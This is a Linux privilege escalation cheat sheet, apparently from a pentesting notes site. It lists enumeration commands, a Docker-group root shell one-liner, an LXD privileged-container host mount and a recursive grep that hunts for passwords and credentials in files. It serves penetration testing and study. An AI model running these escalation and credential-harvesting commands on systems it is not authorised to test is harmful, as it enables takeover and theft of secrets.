---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Linux Privilege Escalation

## System Info

Obtain information about the system **architecture, distribution, and kernel version**.

{% code overflow="wrap" %}
```sh
uname -a  # System information
lsb_release -a  # Distribution information
getconf LONG_BIT  # System architecture
cat /proc/version  # Kernel version
cat /etc/os-release  # OS details
```
{% endcode %}

## Path

Check if you have **write permissions** for any directory in the PATH.

{% code overflow="wrap" %}
```sh
echo $PATH | tr ':' '\n' | sort -u | xargs -I{} bash -c 'if [ -w "{}" ]; then echo "[+] {}"; fi'
```
{% endcode %}

## Environment Variables

Sometimes we can find password or sensitive information in environment variables.

```sh
env  # Environment variables
set  # Shell variables
```

## Groups

List all the groups users belongs to.

```sh
id [<user>]
groups [<user>]
```

### Docker

If you belong to the **Docker group**, you could **mount the filesystem** within a container and have full access to it, allowing you to modify it.

```sh
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

### LXD/LXC

Similar to Docker, with **LXD/LXC**, we can also **mount the filesystem** within a container, granting full access to it.

{% code overflow="wrap" %}
```bash
# On your machine, download and build an alpine image and transfer it to the host
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine
```
{% endcode %}

```sh
# Import the image
lxc image import ./alpine.tar.gz --alias privimg
# Initialize
lxd init
# Create the containter
lxc init privimg privcont -c security.privileged=true
# Mount the filesystem
lxc config device add privcont privdev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start privcont
# Interactive shell
lxc exec privcont /bin/sh
```

## Sudo

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```sh
sudo -l
```

## Capabilities <a href="#capabilities" id="capabilities"></a>

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

```sh
getcap -r / 2>/dev/null
```

## SUID

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```sh
find / -type f -perm -4000 -ls 2>/dev/null
```

## Open Ports

```sh
ss -nltp
netstat -punta
```

## Cron Jobs

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs)

```sh
crontab -l
find / -name "cron*" 2>/dev/null
ls -l /var/log/syslog
ls -l /var/log/cron
```

## Process Monitor

{% code overflow="wrap" %}
```sh
old=$(ps -eo user,cmd); while true; do new=$(ps -eo user,cmd); diff <(echo "$old") <(echo "$new") | grep -E "<|>" | grep -Ev "kworker"; old=$new; done
```
{% endcode %}

{% hint style="info" %}
**You can exclude specific patterns using the `grep -Ev` command.**\
For example, to filter out processes from the current user: **`grep -Ev "kworker|$USER"`**
{% endhint %}

## User Files

```sh
find / -xdev -user $USERNAME 2>/dev/null
```

## Passwords

{% code overflow="wrap" %}
```sh
grep -r -E -n -i \
  -e "(password|passwd|pass|pwd|secret|creds?|credentials?|auth|key|conn(ection)?|pdo|sql)[[:space:]]*[:=][[:space:]]*['\"]?[^[:space:]\'\"]+" \
  -e "db[_-][^[:space:]]*[[:space:]]*[:=][[:space:]]*['\"]?[^[:space:]\'\"]+" \
  -e "define[[:space:]]*\([[:space:]]*['\"]DB_[A-Z_]+['\"][[:space:]]*,[[:space:]]*['\"][^'\"]+" \
  -e "<[^>]*(password|passwd|pass|pwd|secret|creds?|credentials?|auth|key|conn(ection)?|pdo|sql)[^>]*>[^<]+</[^>]*>" \
  -e "['\"](password|passwd|pass|pwd|secret|creds?|credentials?|auth|key|conn(ection)?|pdo|sql)['\"][[:space:]]*:[[:space:]]*['\"][^'\"]+['\"]" \
  -e "[a-zA-Z]+://[^:]+:[^@]+@"
```
{% endcode %}

